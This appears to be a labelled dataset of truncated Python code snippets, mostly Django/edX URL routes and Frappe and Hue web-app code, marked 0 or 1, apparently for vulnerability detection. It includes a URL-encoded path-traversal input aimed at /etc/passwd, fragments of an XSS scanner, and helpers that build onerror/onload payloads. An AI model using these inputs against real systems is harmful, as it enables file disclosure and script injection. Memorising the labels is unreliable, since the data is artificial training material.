'%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '../../boot", "label": 0}, {"snippet_id": 21347, "code": "<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index", "label": 1}, {"snippet_id": 3463, "code": ".find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\"", "label": 0}, {"snippet_id": 5961, "code": " find_packages import sys, os from distutils import versionpredicate here=os.path.abspath(os.path.dirname(__file__)) README=open(os.path.join(here, 'README')).read() version='0.3.22' install_requires=[ 'pymongo", "label": 1}, {"snippet_id": 46050, "code": " collection_doc.doc.get().can_read_or_exception(request.user) collection=Collection2(request.user, document=collection_doc) except Exception, e: raise PopupException(e, title=_(\"Dashboard does not exist or", "label": 0}, {"snippet_id": 29528, "code": "\tproc_count=\"\" \t \tfor line in stdout: \t\tif \"Ncat: \" not in line: \t\t\tfor k in line: \t\t\t\tproc_count=k.split(\":\")[1] \t\telse: \t\t\tproc_count=0 \treturn proc_count\t\t def ssh_command(serv, commands, **kwargs): ", "label": 0}, {"snippet_id": 18516, "code": ".save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade", "label": 0}, {"snippet_id": 12281, "code": "?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses", "label": 0}, {"snippet_id": 39621, "code": "\t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or", "label": 0}, {"snippet_id": 33983, "code": "'Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)", "label": 0}, {"snippet_id": 43435, "code": " self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname,", "label": 0}, {"snippet_id": 28058, "code": " 401) expires=datetime.datetime.now() +expires_in self.response.set_cookie( 'session', session_cookie, expires=expires, httponly=True, secure=True, overwrite=True) self.render_json({'status': 'success'", "label": 0}, {"snippet_id": 49160, "code": ".append(column) if not self.is_reverse() and self.current_columns[0]==self.column_id: return self.get_url_with_query_params({ self.ordering_query_param: '-{}.{}'.format(self.column_id, \".\".join(new_query)) ", "label": 0}, {"snippet_id": 34785, "code": ".__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe", "label": 0}, {"snippet_id": 52504, "code": " workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node',", "label": 0}, {"snippet_id": 14188, "code": "[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), )", "label": 0}, {"snippet_id": 6315, "code": ".section, 'listen_addr') @property def listen_port(self): \"\"\" The port the IdP authentication should listen on(integer). \"\"\" return self.config.getint(self.section, 'listen_port') @property def pysaml2_config", "label": 0}, {"snippet_id": 13481, "code": "'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$", "label": 0}, {"snippet_id": 32413, "code": " section title) to URL anchor name. This function is passed to \"toc\" extension as an extension option, so we can emulate the way how Gitiles converts header titles to URL anchors. Gitiles' official documentation", "label": 0}, {"snippet_id": 54730, "code": "=False) a.author=self.request.user a.article=self.object a.save() return super().form_valid(form) def is_mobile(useragent): devices=[\"Android\", \"iPhone\", \"SymbianOS\", \"Windows Phone\", \"iPad\", \"iPod\"] for", "label": 0}, {"snippet_id": 7839, "code": ".grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+", "label": 0}, {"snippet_id": 12170, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index", "label": 1}, {"snippet_id": 568, "code": "'Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['", "label": 1}, {"snippet_id": 39745, "code": ".fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t", "label": 0}, {"snippet_id": 41258, "code": ".form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route", "label": 1}, {"snippet_id": 53515, "code": "(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST", "label": 0}, {"snippet_id": 37901, "code": " self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*)", "label": 0}, {"snippet_id": 42452, "code": " for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname", "label": 0}, {"snippet_id": 47227, "code": "].is_category() submenu_items={ str(item.name): item for item in menu_items['Records'].get_children()} assert 'Record Metadata' in submenu_items assert isinstance(submenu_items['Record Metadata'], menu", "label": 0}, {"snippet_id": 10032, "code": "\"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' \" \"SELENIUM_DRIVER_LOG_DIR", "label": 0}, {"snippet_id": 4136, "code": ".parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if", "label": 0}, {"snippet_id": 32359, "code": "(top_level, 'docs', 'README.md')): print(' Try loading %s/docs/README.md' % origin) elif os.path.isfile(os.path.join(args.directory, 'README.md')): print(' Try loading %s/README.md' % origin) retcode=1 try", "label": 0}, {"snippet_id": 633, "code": "'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact() xss_result=True if xss_result is True: print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url", "label": 1}, {"snippet_id": 16156, "code": ".views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views", "label": 0}, {"snippet_id": 37148, "code": ".cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet'", "label": 0}, {"snippet_id": 3585, "code": ".W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request", "label": 0}, {"snippet_id": 42265, "code": "\"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns", "label": 0}, {"snippet_id": 31268, "code": " Select \timport pandas as pd \timport http.cookies \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_servers_metrics(user_id.value) \tservers", "label": 0}, {"snippet_id": 45104, "code": ", kwargs={'job_id': job_id})) def list_editor_coordinators(request): coordinators=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor", "label": 0}, {"snippet_id": 48178, "code": "=request.POST[\"text\"] file=request.FILES['file'] user: Profile=get_current_user(request) handle_file(user, headline, category, text, file) except Exception as e: return redirect(\"/admin/media/add?hint=", "label": 0}, {"snippet_id": 21851, "code": " url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 13851, "code": "/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views", "label": 0}, {"snippet_id": 49175, "code": ".get_url_with_query_params({ self.ordering_query_param: '{}.{}'.format(self.column_id, \".\".join(new_query)) }) else: return self.get_reverse_sort_by() def get_remove_sort_by(self): new_query=[] for column", "label": 0}, {"snippet_id": 48758, "code": "])) r: GroupReservation=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) if(aid.RID.createdByUser==u or u.rights > 1) and aid.RID==r and not r.submitted: aid.delete() else: return HttpResponseRedirect", "label": 0}, {"snippet_id": 20391, "code": ".course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self", "label": 0}, {"snippet_id": 1965, "code": " vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain", "label": 0}, {"snippet_id": 52727, "code": " response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_workflow(request, doc_id): workflow=Workflow(document=Document2", "label": 0}, {"snippet_id": 4630, "code": " 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select", "label": 0}, {"snippet_id": 3402, "code": " parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text", "label": 0}, {"snippet_id": 21574, "code": "+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading", "label": 0}, {"snippet_id": 38867, "code": "\t\t\t\t'Document for field \"{0}\" attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value)", "label": 0}, {"snippet_id": 5886, "code": "/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload", "label": 1}, {"snippet_id": 19965, "code": ".testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run()", "label": 0}, {"snippet_id": 12655, "code": ".news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>", "label": 0}, {"snippet_id": 7230, "code": "\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url", "label": 0}, {"snippet_id": 29130, "code": "(serv, commands, print_out=\"1\") \t def waf_install(serv, **kwargs): \timport sql \tscript=\"waf.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \tproxy=sql.get_setting('proxy') \thaproxy_dir=sql.get_setting", "label": 0}, {"snippet_id": 47892, "code": ".displayName) au.email=mail au.save() user.save() else: username=str(request.POST[\"username\"]) displayname=str(request.POST[\"display_name\"]) dect=int(request.POST[\"dect\"]) notes=str(request.POST[\"notes\"]) pw1", "label": 1}, {"snippet_id": 52432, "code": "'doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json", "label": 0}, {"snippet_id": 23491, "code": " ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION')", "label": 0}, {"snippet_id": 9554, "code": "'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'),", "label": 0}, {"snippet_id": 40482, "code": "\"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision", "label": 0}, {"snippet_id": 21927, "code": " name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth", "label": 0}, {"snippet_id": 17281, "code": "'AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid", "label": 0}, {"snippet_id": 19316, "code": "=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True", "label": 0}, {"snippet_id": 12033, "code": "]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'),", "label": 0}, {"snippet_id": 52866, "code": "=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if 'Max retries exceeded with url' in str(detail): detail='%s: %s' %(_('The Oozie server is not running", "label": 0}, {"snippet_id": 34184, "code": " \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\", \"custom\"), cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name", "label": 0}, {"snippet_id": 29384, "code": "=str(upload(serv, tmp_file, cfg, dir='fullpath')) \ttry: \t\terror +=ssh_command(serv, commands) \texcept Exception as e: \t\terror +=e \tif error: \t\treturn error \t\t def open_port_firewalld(cfg): \ttry: \t\tconf", "label": 0}, {"snippet_id": 7969, "code": "/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups", "label": 0}, {"snippet_id": 42914, "code": ".split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name", "label": 0}, {"snippet_id": 51460, "code": "', 'django.contrib.staticfiles', 'django.contrib.humanize', 'django_celery_beat', 'compressor', 'websecmap.app', 'websecmap.organizations', 'websecmap.scanners', 'websecmap.reporting', 'websecmap.map',", "label": 0}, {"snippet_id": 54712, "code": ".get_form() if form.is_valid(): return self.form_valid(form) else: return self.form_invalid(form) def form_valid(self, form): a=form.save(commit=False) a.author=self.request.user a.article=self.object a", "label": 0}, {"snippet_id": 24573, "code": ".run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback) if self.testsonly: msg=colorize('green', 'Running in testsonly mode...", "label": 0}, {"snippet_id": 32793, "code": ")s</td></tr>') %{'num': i, 'quot': \"'\", 'line': line}) self.wfile.write('</table>') self._WriteTemplate('footer.html') def _DoCSS(self, template): self._WriteHeader('text/css') self._WriteTemplate(template", "label": 0}, {"snippet_id": 20665, "code": "'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change", "label": 0}, {"snippet_id": 22887, "code": "/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/", "label": 1}, {"snippet_id": 49532, "code": " remote_field=self.model_field.rel if hasattr(self.model_field, 'rel') else self.model_field.remote_field qs=remote_field.model.objects.filter(pk__in=pks) values=[ SmartFilterValue(self.field_name, obj, str(obj", "label": 0}, {"snippet_id": 32353, "code": "() elif os.path.isfile(os.path.join(top_level, 'docs', 'README.md')): print(' Try loading %s/docs/README.md' % origin) elif os.path.isfile(os.path.join(args.directory, 'README.md')): print(' Try loading", "label": 0}, {"snippet_id": 3623, "code": ",'+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": vul_param+\" parameters are vulnerable to", "label": 0}, {"snippet_id": 31446, "code": "\tp[serv].line(\"Date\", \"curr_con\", source=source, alpha=0.5, color=' \t\tp[serv].line(\"Date\", \"curr_ssl_con\", source=source, alpha=0.5, color=\" \t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5", "label": 0}, {"snippet_id": 27691, "code": " else None) if values['is_logged_in']: values['switch_account_url']=make_login_url(self.request.url) values['logout_url']=make_logout_url(dest_url=self.request.url) template=_JINJA_ENVIRONMENT.get_template", "label": 0}, {"snippet_id": 20274, "code": " times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This", "label": 0}, {"snippet_id": 32748, "code": "&amp;').replace( '<', '&lt;').replace( '>', '&gt;').replace( '\"', '&quot;') for i, line in enumerate(data.splitlines(), start=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line\">' '", "label": 0}, {"snippet_id": 53833, "code": "-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str", "label": 1}, {"snippet_id": 49507, "code": ", choice[0], self.query_params) for choice in( (1, _('Yes')), (0, _('No')) ) ] elif issubclass(type(self.model_field), ForeignKey): pks=self.object_list.order_by().distinct().values_list('%s__pk' % self", "label": 0}, {"snippet_id": 43955, "code": "\"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor f in filters", "label": 0}, {"snippet_id": 22356, "code": ", 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile'", "label": 0}, {"snippet_id": 46039, "code": "=collection_id) if USE_NEW_EDITOR.get(): collection_doc.can_read_or_exception(request.user) else: collection_doc.doc.get().can_read_or_exception(request.user) collection=Collection2(request.user, document", "label": 0}, {"snippet_id": 11675, "code": ".password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done", "label": 0}, {"snippet_id": 37807, "code": "\t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post", "label": 0}, {"snippet_id": 25475, "code": "*defaults) field.part_name=fname fields.append(field) super().__init__( fields=fields, require_all_fields=False, *args, **kwargs ) self.require_all_fields=require_all_fields self.required=self.one_required def", "label": 0}, {"snippet_id": 3354, "code": " impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers", "label": 0}, {"snippet_id": 11397, "code": "}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course", "label": 0}, {"snippet_id": 52628, "code": ") if node_data['type'] in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data", "label": 0}, {"snippet_id": 11403, "code": "'green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"", "label": 0}, {"snippet_id": 43274, "code": ": \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self", "label": 0}, {"snippet_id": 13945, "code": " 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 28219, "code": "(cfg, cfg))\t if serv is not None and form.getvalue('config') is not None: \ttry: \t\tfunct.logging(serv, \"config.py edited config\") \texcept: \t\tpass \t\t \tconfig=form.getvalue('config') \toldcfg=form.getvalue", "label": 0}, {"snippet_id": 48621, "code": " +\"&srid=\" +str(sr.id)) if \"rid\" in request.GET: r=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser=u", "label": 0}, {"snippet_id": 13037, "code": ".update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url", "label": 0}, {"snippet_id": 46654, "code": "*args, **kwargs): form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.render_to_response(self.get_context_data()) def get_form_kwargs(self, *args, **kwargs): kwargs=super", "label": 0}, {"snippet_id": 18986, "code": "'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', ", "label": 0}, {"snippet_id": 6262, "code": " '/dev/log' maybe. \"\"\" res=self.config.get(self.section, 'syslog_socket') if not res: res=None return res @property def debug(self): \"\"\" Set to True to log debug messages(boolean). \"\"\" return self.config", "label": 0}, {"snippet_id": 17412, "code": "'ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', ", "label": 0}, {"snippet_id": 27706, "code": ".request.url) template=_JINJA_ENVIRONMENT.get_template(path) self._add_security_response_headers() self.response.headers['Content-Type']='text/html' self.response.out.write(template.render(values)) self", "label": 0}, {"snippet_id": 2936, "code": "(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger", "label": 0}, {"snippet_id": 29941, "code": "/keys/'+name+'.pem' \t \ttry: \t\twith open(ssh_keys, \"w\") as conf: \t\t\tconf.write(form.getvalue('ssh_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys", "label": 0}, {"snippet_id": 34963, "code": ".creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert", "label": 0}, {"snippet_id": 32818, "code": "('text/css') self._WriteTemplate(template) def _DoNotFound(self): self._WriteHeader('text/html', status_code=404) self.wfile.write('<html><body>%s not found</body></html>' % self.path) def _DoUnknown(self", "label": 0}, {"snippet_id": 32022, "code": ".utils import safestring from django.utils.translation import ugettext_lazy as _ from django.utils.translation import ungettext_lazy from horizon import tables from openstack_dashboard import api class", "label": 1}, {"snippet_id": 44677, "code": " response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype=\"application/json\") def _get_workflows(user): return[{ 'name': workflow.name, 'owner", "label": 0}, {"snippet_id": 11008, "code": " servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets", "label": 0}, {"snippet_id": 51703, "code": "='/static/' if DEBUG: STATIC_ROOT='static' else: STATIC_ROOT='/srv/dashboard/static/' JET_SIDE_MENU_ITEMS=[ {'label': _('\ud83d\udd27 Configuration'), 'items':[ {'name': 'auth.user'}, {'name': 'auth.group'}, {'name", "label": 1}, {"snippet_id": 4199, "code": ".logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid,", "label": 0}, {"snippet_id": 14640, "code": "='node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD", "label": 0}, {"snippet_id": 6305, "code": " @property def listen_addr(self): \"\"\" IP address to listen on. \"\"\" return self.config.get(self.section, 'listen_addr') @property def listen_port(self): \"\"\" The port the IdP authentication should listen", "label": 0}, {"snippet_id": 23202, "code": ", name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 25089, "code": " generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str)", "label": 0}, {"snippet_id": 8479, "code": ".update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\")", "label": 0}, {"snippet_id": 9986, "code": " from mock import patch, call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd()", "label": 0}, {"snippet_id": 10757, "code": ".xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) 